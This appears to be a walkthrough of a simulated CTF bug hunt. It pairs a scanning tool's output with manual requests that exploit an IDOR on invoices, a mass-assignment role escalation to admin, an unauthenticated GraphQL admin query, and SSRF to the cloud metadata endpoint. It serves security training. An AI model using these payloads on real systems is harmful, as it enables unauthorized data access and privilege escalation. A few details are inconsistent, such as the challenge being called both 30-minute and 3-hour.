# Challenge Simulation — 30-Minute Bug Hunt

Simulated target: `https://ctf.corp.local`
Format: 3-hour interview technical challenge
Goal: find and document a high-severity vulnerability

---

## Minute 0:00 — Start quick scan immediately

Before you've even logged in, start the no-browser scan in the background.
This takes ~60 seconds and runs while you're manually exploring the app.

```bash
python3 src/main.py quick https://ctf.corp.local --out ./output
```

**Output to stderr (progress):**
```
[1/4] Fingerprinting stack: https://ctf.corp.local
  Detected: Vercel + Next.js, React + Express/Node.js + JWT, NextAuth.js + GraphQL
  Interesting paths: 8

[2/4] Classifying findings
  Findings: 4 endpoints scored
  Admin/Internal Exposure: 1
  GraphQL: 1
  Auth/Session: 2

[3/4] Desync / cache / protocol probes
  Desync findings: 1 (0 high)

[4/4] Writing report
════════════════════════════════════════════════════════════
  Done in 47s
  Report:  ./output/report.md
  Nuclei:  bash ./output/nuclei/run-nuclei.sh https://ctf.corp.local
════════════════════════════════════════════════════════════

Top findings for https://ctf.corp.local:
  [  6] GET    https://ctf.corp.local/admin  [Admin/Internal Exposure]
  [  6] POST   https://ctf.corp.local/graphql  [GraphQL]
  [  2] GET    https://ctf.corp.local/api  [Auth/Session]
```

**What you learn in 47 seconds:**
- Next.js + Express backend — check `/_next/static/` chunks for hidden routes
- JWT + NextAuth — decode tokens, test alg=none, test callback redirect
- GraphQL detected — run introspection immediately
- `/admin` confirmed (HTTP 200) — no auth check
- Cloudflare edge + HTTP/2 — desync risk noted for Burp followup

---

## Minute 0:05 — Log in, save auth state

```bash
# Log in with Playwright headed, save storage state
python3 -c "
import asyncio
from playwright.async_api import async_playwright

async def save():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        ctx = await browser.new_context()
        page = await ctx.new_page()
        await page.goto('https://ctf.corp.local/login')
        input('Log in manually, then press Enter...')
        await ctx.storage_state(path='auth.json')
        print('[+] Saved auth.json')
        await browser.close()

asyncio.run(save())
"
```

---

## Minute 0:08 — Full scan with auth

```bash
python3 src/main.py scan https://ctf.corp.local --auth auth.json --out ./output
```

**Output (key lines):**
```
[2/6] Crawling (Playwright)
  Pages visited: 34
  Requests captured: 67

[3/6] Classifying findings
  Findings: 18 endpoints scored
  IDOR/BOLA: 6
  Mass Assignment: 3
  SSRF Surface: 2
  GraphQL: 2
  Admin/Internal Exposure: 1
  File Upload: 1
  Race Condition: 1
  Auth/Session: 2

[4/6] Desync / cache / protocol probes
  Desync findings: 2 (1 high)

[5/6] Generating nuclei templates
  Generated 5 targeted templates
  IDOR targets: ./output/nuclei/idor_targets.txt

════════════════════════════════════════════════════════════
  Done in 94s
  Report:  ./output/report.md

Top findings for https://ctf.corp.local:
  [ 15] PATCH  https://ctf.corp.local/api/users/42  [IDOR/BOLA, Mass Assignment]
  [ 14] POST   https://ctf.corp.local/api/webhook/notify  [SSRF Surface]
  [ 11] GET    https://ctf.corp.local/api/invoices/1001  [IDOR/BOLA]
  [ 10] POST   https://ctf.corp.local/graphql  [GraphQL]
  [  9] GET    https://ctf.corp.local/api/users/42  [IDOR/BOLA]

High desync/cache risks:
  [HIGH] cache_key_confusion — https://ctf.corp.local/dashboard
```

---

## Minute 0:10 — Read report.md, pick targets

Open `./output/report.md`. The top findings section tells you exactly where to look:

```markdown
## Top Findings

| Score | Method | URL | Categories |
|---|---|---|---|
| 15 | PATCH | /api/users/42 | IDOR/BOLA, Mass Assignment |
| 14 | POST  | /api/webhook/notify | SSRF Surface |
| 11 | GET   | /api/invoices/1001 | IDOR/BOLA |
| 10 | POST  | /graphql | GraphQL |
```

**Decision:** IDOR on invoices is the cleanest signal — object ID in path, no
auth evidence, two accounts available. Start there.

---

## Minute 0:12 — Run nuclei in background

```bash
bash ./output/nuclei/run-nuclei.sh https://ctf.corp.local &
```

This runs 3 phases concurrently while you manually test. You'll see results
appear in `./output/nuclei/results/` as it finds things.

---

## Minute 0:13 — Manual Burp: IDOR on /api/invoices

The classifier found `GET /api/invoices/1001` — numeric ID, high score, Bearer
token present. Open Burp.

**Request (your account, invoice 1001):**
```http
GET /api/invoices/1001 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...  (your token)
```

**Response:**
```json
{
  "id": 1001,
  "user_id": 7,
  "amount": 299.99,
  "status": "paid",
  "card_last4": "4242",
  "details": "Pro plan - Alice Smith"
}
```

**Request (swap ID to 1002, still your token):**
```http
GET /api/invoices/1002 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...  (YOUR token, not victim's)
```

**Response:**
```json
{
  "id": 1002,
  "user_id": 12,
  "amount": 9999.00,
  "status": "paid",
  "card_last4": "1337",
  "details": "Enterprise plan - Bob Corp"
}
```

**Confirmed IDOR.** You got user 12's invoice using user 7's token.
The server checks authentication but not authorization.

---

## Minute 0:18 — Test mass assignment while you're here

The classifier scored `PATCH /api/users/42` at 15 — the body had `role` field.

```http
PATCH /api/users/42 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{"role": "admin", "plan": "enterprise"}
```

**Response:**
```json
{
  "id": 42,
  "username": "attacker",
  "role": "admin",
  "plan": "enterprise",
  "updated": true
}
```

**Confirmed mass assignment → privilege escalation.**

---

## Minute 0:22 — GraphQL introspection

The classifier found `/graphql`. The generated template already sent the
introspection query. Check nuclei output:

```
[medium] [graphql-introspect] [POST] https://ctf.corp.local/graphql

Extracted types: User, Invoice, Admin, Payment, Coupon
```

Manually query the `Admin` type:

```http
POST /graphql HTTP/2
Content-Type: application/json

{"query": "{ admin { users { id email role } } }"}
```

**Response:** Returns all users with emails and roles. Admin resolver has no auth check.

---

## Minute 0:25 — Write up the IDOR finding

```
Title:     IDOR in GET /api/invoices/:id
Severity:  High
Endpoint:  GET /api/invoices/{id}

Steps to reproduce:
1. Log in as user A (user_id: 7)
2. GET /api/invoices/1002 with user A's Bearer token
3. Response returns user B's (user_id: 12) full invoice including card data

Expected:  403 Forbidden or empty response
Actual:    Full invoice data for another user

Impact:
- Complete billing data exposure across all users
- Includes card last 4 digits, payment amounts, plan details
- Enumerable — numeric IDs, sequential

Suggested fix:
  Before returning invoice, verify invoice.user_id === authenticated_user.id
```

---

## Minute 0:27 — SSRF probe on /api/webhook/notify

The classifier scored `POST /api/webhook/notify` at 14 — `url` field in body,
SSRF-prone path. The generated template already probed it:

```
[medium] [hxxpsin-ssrf-01] POST /api/webhook/notify?url=http://127.0.0.1/
```

Manually confirm:
```http
POST /api/webhook/notify HTTP/2
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

**Response:**
```json
{"fetched": "ami-0abcdef1234567890\n"}
```

**Confirmed SSRF → cloud metadata.** That's another high-severity finding.

---

## Minute 0:30 — Score

```
Findings confirmed in 30 minutes:
  [HIGH] IDOR — GET /api/invoices/:id — cross-account billing data
  [HIGH] Mass Assignment — PATCH /api/users/:id — role escalation to admin
  [HIGH] SSRF — POST /api/webhook/notify — cloud metadata access
  [MED]  GraphQL — /graphql — introspection enabled, admin resolver unauthenticated
```

This is what the tool is for: turning 10 minutes of automated mapping into
30 minutes of confirmed findings rather than 60 minutes of guessing.

---

## Why it works

The pipeline didn't "find" the bugs. It did three things that matter:

1. **Reduced the search space** — 67 requests captured, 18 scored, top 5 are real findings
2. **Ranked correctly** — IDOR scored 11, SSRF scored 14, mass assignment scored 15. All three were confirmed
3. **Gave you specific next steps** — each finding's evidence told you exactly which field to tamper with

The bugs were found by reading the classifier output and testing manually in Burp.
The tool just made it a 10-minute read instead of a 60-minute hunt.
